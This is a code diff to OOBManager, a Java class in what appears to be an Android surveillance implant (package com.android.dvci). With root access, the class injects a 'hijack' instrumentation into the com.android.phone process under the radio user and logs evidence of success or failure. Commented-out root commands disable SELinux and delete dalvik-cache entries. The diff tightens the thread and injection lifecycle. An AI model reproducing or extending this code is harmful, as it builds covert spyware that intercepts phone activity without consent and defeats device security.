@@ -13,6 +13,7 @@ import com.android.dvci.util.Instrument;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
+import java.io.File;
 import java.util.Date;
 
 public class OOBManager implements Runnable{
@@ -27,7 +28,7 @@ public class OOBManager implements Runnable{
 	private Thread thread = null;
 
 	public synchronized boolean isThreadRunning() {
-		return threadRunning;
+		return threadRunning ;
 	}
 
 	public synchronized void setThreadRunning(boolean threadRunning) {
@@ -35,26 +36,53 @@ public class OOBManager implements Runnable{
 	}
 
 	public void stop() {
-		if( Status.haveRoot()) {
-
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (stop): starting"); //$NON-NLS-1$
+		}
+		if( Status.haveRoot() && this.thread != null) {
 			runOOB = false;
 			Date start = new Date();
 			long diff_sec = (new Date().getTime() - start.getTime()) / 1000;
 			while (diff_sec < 60) {
 				diff_sec = (new Date().getTime() - start.getTime()) / 1000;
-				if (isThreadRunning() == false) {
-					break;
+				try {
+					this.thread.join(500);
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (stop): join return ts="+ this.thread.getState()); //$NON-NLS-1$
+					}
+					if(this.thread.getState() == Thread.State.TERMINATED) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (stop): joined "); //$NON-NLS-1$
+						}
+						setThreadRunning(false);
+						this.thread = null;
+						if(this.hijack.isStarted()){
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (stop): something wrong instrumentation still active, stop it"); //$NON-NLS-1$
+							}
+							this.hijack.stopInstrumentation();
+						}
+						this.hijack = null;
+						break;
+					}
+				} catch (Exception e) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (stop): failed to join thread"); //$NON-NLS-1$
+					}
 				}
-				Utils.sleep(2000);
+				Utils.sleep(500);
 			}
 			if(isThreadRunning()){
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (stop): failed to stop thread"); //$NON-NLS-1$
 				}
+				EvidenceBuilder.info(M.e("OOB failed to stop"));
 			}else{
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (stop): OK"); //$NON-NLS-1$
 				}
+				EvidenceBuilder.info(M.e("OOB correctly stopped"));
+
 			}
 		}
 	}
@@ -78,36 +106,39 @@ public class OOBManager implements Runnable{
 
 	@Override
 	public void run() {
+		setThreadRunning(true);
 		while(runOOB) {
-			setThreadRunning(true);
 			if (Status.haveRoot()) {
-				if (hijack != null && !hijack.isStarted()) {
-					hijack.startInstrumentation();
-				} else {
-					if (hijack == null || !hijack.isStarted()) {
-						startInjection();
-					}
+				if (hijack == null) {
+					startInjection();
 				}
 			}
 			Utils.sleep(1000);
+		}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "(run): asked to stop");
 		}
 		try {
 			if (hijack != null) {
 				hijack.stopInstrumentation();
 			}
-		}finally {
-			setThreadRunning(false);
+		}catch (Exception e){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(run): failed to stopInstrumentation");
+			}
 		}
+
 	}
 
 
 	public void start() {
-		runOOB = true;
+
 		if (isThreadRunning()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(start): thread ALREADY running");
 			}
 		} else {
+			runOOB = true;
 			if (thread == null) {
 				thread = new Thread(this);
 			}
@@ -138,8 +169,16 @@ public class OOBManager implements Runnable{
 		//Execute.executeRoot(M.e("setenforce 0") );
 		//Execute.executeRoot(M.e("rm /data/dalvik-cache/") + Status.getApkName().replace("/", "@") + "*");
 		if(hijack==null) {
-			hijack = new Instrument(M.e("com.android.phone"), Status.getApkName()+"@"+ Status.getAppContext().getPackageName(), M.e("irp"), Status.self().semaphoreMediaserver, M.e("pa.data"));
+			hijack = new Instrument(M.e("com.android.phone"), Status.getApkName()+"@"+ Status.getAppContext().getPackageName(), M.e("irp"), Status.self().semaphoreMediaserver, M.e("pa.data"),M.e("radio"));
 			hijack.setInstrumentationSuccessDir(messageStorage);
+			/* todo: instead of kill the process as precaution, try to understand if is already injected
+			 * for example check for the needle inside the memory of the target process.
+			*/
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(actualStart): assure to kill the old process");
+			}
+			hijack.stopInstrumentation();
 		}
 		if (hijack.isStarted()){
 			if (Cfg.DEBUG) {
